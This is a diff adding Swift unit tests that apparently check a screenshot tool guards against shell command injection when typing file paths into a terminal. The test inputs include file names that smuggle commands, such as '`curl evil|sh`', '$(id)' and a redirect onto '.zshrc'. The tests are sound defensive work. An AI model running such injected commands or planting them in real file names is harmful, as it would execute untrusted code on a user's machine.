@@ -300,6 +300,32 @@ final class HotshotCoreTests: XCTestCase {
         XCTAssertNil(typedScreenshotText(path: "/Users/me/bad\u{2028}name.png", targetCLI: .claude))
     }
 
+    func testContainsShellCommandMetacharactersFlagsExecutableNames() {
+        XCTAssertFalse(containsShellCommandMetacharacters("/Users/me/Desktop/Screenshot 2026-10-02 at 00.22.54.png"))
+        XCTAssertFalse(containsShellCommandMetacharacters("/Users/me/My Shots/a (2) [x] 'q' #1.png"))
+        XCTAssertTrue(containsShellCommandMetacharacters("/Users/me/Desktop/`curl evil|sh`.png"))
+        XCTAssertTrue(containsShellCommandMetacharacters("/Users/me/Desktop/$(id).png"))
+        XCTAssertTrue(containsShellCommandMetacharacters("/Users/me/Desktop/a;id;.png"))
+        XCTAssertTrue(containsShellCommandMetacharacters("/Users/me/Desktop/a&id.png"))
+        XCTAssertTrue(containsShellCommandMetacharacters("/Users/me/Desktop/>.zshrc.png"))
+    }
+
+    func testTypedScreenshotTextRejectsShellMetacharactersInBracketedForm() {
+        // The bracketed fallback types the path verbatim and may land on a
+        // bare shell prompt (unknown terminal / no CLI detected), where a
+        // trailing Return would execute these.
+        XCTAssertNil(typedScreenshotText(path: "/Users/me/Desktop/`id`.png", targetCLI: .claude))
+        XCTAssertNil(typedScreenshotText(path: "/Users/me/Desktop/$(id).png", targetCLI: .claude))
+        XCTAssertNil(typedScreenshotText(path: "/Users/me/Desktop/a;id;.png", targetCLI: .claude))
+        // The plain-path form backslash-escapes them, so it still injects.
+        XCTAssertEqual(
+            typedScreenshotText(path: "/Users/me/Desktop/a;id.png", targetCLI: .plainPath),
+            "/Users/me/Desktop/a\\;id.png ")
+        XCTAssertEqual(
+            typedScreenshotText(path: "/Users/me/Desktop/`id`.png", targetCLI: .plainPath),
+            "/Users/me/Desktop/\\`id\\`.png ")
+    }
+
     func testTrustedEnrichedClipboardPathAcceptsExistingEscapedPath() {
         XCTAssertEqual(
             trustedEnrichedClipboardPath(
